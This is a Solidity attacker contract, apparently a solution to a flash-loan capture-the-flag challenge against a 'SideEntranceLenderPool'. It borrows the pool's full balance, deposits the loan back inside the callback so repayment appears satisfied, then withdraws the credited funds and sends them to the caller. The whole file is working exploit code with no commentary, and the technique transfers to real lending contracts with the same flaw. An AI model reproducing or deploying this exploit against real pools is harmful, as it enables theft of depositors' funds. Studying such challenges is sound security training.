pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
    receive() external payable {}

    function attack(address pool) public {
        SideEntranceLenderPool(pool).flashLoan(address(pool).balance);
        SideEntranceLenderPool(pool).withdraw();
        msg.sender.call{ value: address(this).balance }('');
    }

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }

}
